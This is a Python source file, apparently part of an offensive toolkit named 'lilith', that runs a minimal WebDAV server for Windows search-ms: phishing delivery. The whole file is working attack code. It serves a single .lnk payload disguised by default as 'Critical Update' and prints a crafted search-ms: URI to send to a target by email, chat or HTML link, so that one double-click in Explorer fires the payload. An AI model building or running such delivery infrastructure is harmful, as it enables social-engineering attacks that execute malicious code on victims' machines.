"""
Minimal WebDAV server for search-ms: delivery.

When Windows receives a search-ms: URI it opens Explorer's search-results
view, which issues a PROPFIND against the Location crumb.  The attacker's
DAV share returns a single .lnk entry; the user clicks it and the LNK fires.

Usage (via lilith CLI):
  lilith network webdav --lnk-path /path/to/payload.lnk [--port 8080] [--lnk-name "Critical Update"]
"""

from __future__ import annotations

import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote


def run_webdav(
    lhost:    str,
    lnk_path: str,
    port:     int  = 8080,
    lnk_name: str  = "Critical Update",
) -> None:
    """Start WebDAV server and print the search-ms: delivery URL.  Blocks."""

    lnk_bytes = open(lnk_path, "rb").read()
    lnk_file  = os.path.basename(lnk_path)
    if not lnk_name.lower().endswith(".lnk"):
        lnk_display = lnk_name + ".lnk"
    else:
        lnk_display = lnk_name

    share_url    = f"http://{lhost}:{port}/"
    search_ms    = (
        f"search-ms:query={quote(lnk_display)}"
        f"&crumb=location:{quote(share_url, safe='')}"
        f"&displayname={quote(lnk_display)}"
    )

    class _DAVHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *a):
            print(f"[webdav] {self.client_address[0]} {fmt % a}")

        def _send_dav_headers(self, status: int, ctype: str, length: int) -> None:
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(length))
            self.send_header("DAV", "1, 2")
            self.send_header("MS-Author-Via", "DAV")
            self.send_header("Allow", "OPTIONS, PROPFIND, GET, HEAD")
            self.end_headers()

        def do_OPTIONS(self):
            self._send_dav_headers(200, "text/plain", 0)

        def do_HEAD(self):
            path = self.path.lstrip("/")
            if path == lnk_file or path == lnk_display:
                self._send_dav_headers(200, "application/octet-stream", len(lnk_bytes))
            else:
                self._send_dav_headers(404, "text/plain", 0)

        def do_GET(self):
            path = self.path.lstrip("/")
            if path == lnk_file or path == lnk_display:
                self._send_dav_headers(200, "application/octet-stream", len(lnk_bytes))
                self.wfile.write(lnk_bytes)
            else:
                body = b"Not Found"
                self._send_dav_headers(404, "text/plain", len(body))
                self.wfile.write(body)

        def do_PROPFIND(self):
            depth = self.headers.get("Depth", "1")
            path  = self.path.rstrip("/")

            entries = [_propfind_entry("/", is_dir=True)]
            if depth != "0":
                entries.append(_propfind_entry(f"/{lnk_file}", is_dir=False,
                                               size=len(lnk_bytes), display=lnk_display))

            body = (
                '<?xml version="1.0" encoding="utf-8"?>'
                '<D:multistatus xmlns:D="DAV:">'
                + "".join(entries)
                + "</D:multistatus>"
            ).encode("utf-8")

            self._send_dav_headers(207, "application/xml; charset=utf-8", len(body))
            self.wfile.write(body)

    def _propfind_entry(href: str, *, is_dir: bool,
                         size: int = 0, display: str = "") -> str:
        restype = "<D:resourcetype><D:collection/></D:resourcetype>" if is_dir \
                  else "<D:resourcetype/>"
        clen    = "" if is_dir else f"<D:getcontentlength>{size}</D:getcontentlength>"
        dname   = f"<D:displayname>{display}</D:displayname>" if display else ""
        return (
            f"<D:response>"
            f"<D:href>{href}</D:href>"
            f"<D:propstat><D:prop>"
            f"{restype}{clen}{dname}"
            f"</D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>"
            f"</D:response>"
        )

    server = HTTPServer(("0.0.0.0", port), _DAVHandler)
    print(f"[+] WebDAV server: http://0.0.0.0:{port}/  (serving {lnk_file})")
    print(f"\n[*] Deliver this URI to the target (email, chat, HTML href):\n")
    print(f"    {search_ms}\n")
    print(f"[*] When clicked, Explorer opens a search window showing '{lnk_display}'.")
    print(f"    One double-click fires the LNK payload.\n")
    print(f"[*] Ctrl-C to stop.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
